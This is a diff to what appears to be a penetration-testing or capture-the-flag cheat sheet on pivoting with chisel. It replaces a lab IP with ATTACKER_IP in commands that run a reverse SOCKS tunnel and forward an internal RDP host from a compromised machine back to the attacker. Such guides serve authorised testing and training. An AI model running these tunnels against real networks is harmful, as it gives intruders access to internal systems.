@@ -35,7 +35,7 @@ Reverse SOCKS pivot: run the server on your box, the client on the foothold:
 ./chisel server --reverse -p 8080
 
 # on the compromised host (pulled over from your machine)
-./chisel client 10.10.14.5:8080 R:socks
+./chisel client ATTACKER_IP:8080 R:socks
 ```
 
 Point your tools at the SOCKS proxy (default `127.0.0.1:1080`) via proxychains:
@@ -48,7 +48,7 @@ Forward a single internal service to your localhost instead:
 
 ```bash
 # on the foothold
-./chisel client 10.10.14.5:8080 R:3389:172.16.5.19:3389
+./chisel client ATTACKER_IP:8080 R:3389:172.16.5.19:3389
 # now 127.0.0.1:3389 on your box reaches the internal RDP host
 ```
 
